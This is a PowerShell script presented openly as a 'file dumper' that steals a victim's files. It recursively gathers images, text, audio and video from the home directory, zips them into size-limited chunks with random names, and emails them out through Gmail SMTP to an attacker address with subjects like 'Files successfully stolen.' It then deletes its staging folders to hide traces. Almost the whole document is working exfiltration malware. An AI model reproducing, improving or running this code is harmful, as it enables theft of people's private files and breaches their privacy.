# File dumper to email for windows. Very devestating if ran on stacked PC


# Might not work. It has been a while for me.






$mainDump = New-Item -Path $home\MainDump -ItemType Directory

$regex = '(\.png)|(\.jpg)|(\.txt)|(\.mp3)|(\.wav)|(\.ogg)|(\.mp4)'

$files = Get-ChildItem -recurse –Path $home

$subDump = New-Item -Path $home\MainDump\SubDump -ItemType Directory

$redirectedDump = New-Item -Path $home\MainDump\RedirectedDump -ItemType Directory

$preferredSize = 20

$maxSize = 25

$currentSize = 0

$totalFiles = 0

function Get-RandomAlphanumericString
{
    [CmdletBinding()]
    Param ([int] $length = 8)
 
    Begin {}
 
    Process
    {
        Write-Output (-join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length  | % {[char]$_}))
    }
}

foreach ($file in $files) {

    if ($file -match $regex) {

	if ($file -match '.meta') {} else {

		if ((Get-Item $file.FullName).length/1MB + $currentSize -lt $maxSize) {

			Copy-Item $file.FullName -Destination $subDump

			$currentSize += (Get-Item $file.FullName).length/1MB

		}
		else {

			Copy-Item $file.FullName -Destination $redirectedDump

		}

		if ($currentSize -gt $preferredSize) {

			$randomName = Get-RandomAlphanumericString

			Compress-Archive $subdump -DestinationPath $home\MainDump\$randomName

			Remove-Item $subDump -Recurse -Force

			$currentSize = 0

			$subDump = New-Item -Path $home\MainDump\SubDump -ItemType Directory

			$totalFiles += 1	

		}
	}
    }
}

$randomName = Get-RandomAlphanumericString

Compress-Archive $subdump -DestinationPath $home\MainDump\$randomName

Remove-Item $subDump -Recurse -Force

$currentSize = 0

$totalFiles += 1

$files = Get-ChildItem –Path $home\MainDump\RedirectedDump

$index = 0

foreach ($file in $files) {

	$index += 1

	$SMTPServer = 'smtp.gmail.com'

	$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
	$SMTPInfo.EnableSsl = $true
	$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR-EMAIL', 'YOUR-APP-PASSWORD)

	$ReportEmail = New-Object System.Net.Mail.MailMessage
	$ReportEmail.From = 'YOUR-EMAIL'
	$ReportEmail.To.Add('YOUR-EMAIL')
	$ReportEmail.Subject = 'Redirected File Stolen!'
	$ReportEmail.Body = -join($index, "/", (ls $redirectedDump).Count)

	$ReportEmail.Attachments.Add($file.FullName)

	$SMTPInfo.Send($ReportEmail)

	$SMTPInfo.Dispose()

	$ReportEmail.Dispose()
}

Start-Sleep 10

Remove-Item $home\MainDump\RedirectedDump -Recurse -Force

$files = Get-ChildItem –Path $home\MainDump

$index = 0

foreach ($file in $files) {

	$index += 1

	Write-Output($file)

	$SMTPServer = 'smtp.gmail.com'

	$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
	$SMTPInfo.EnableSsl = $true
	$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR-EMAIL', 'YOUR-APP-PASSWORD')

	$ReportEmail = New-Object System.Net.Mail.MailMessage
	$ReportEmail.From = 'YOUR-EMAIL'
	$ReportEmail.To.Add('YOUR-EMAIL')
	$ReportEmail.Subject = 'Files successfully stolen.'
	$ReportEmail.Body = -join($index, "/", $totalFiles)

	$ReportEmail.Attachments.Add($file.FullName)

	$SMTPInfo.Send($ReportEmail)

	$SMTPInfo.Dispose()

	$ReportEmail.Dispose()

}

Start-Sleep 10

Remove-Item $mainDump -Recurse -Force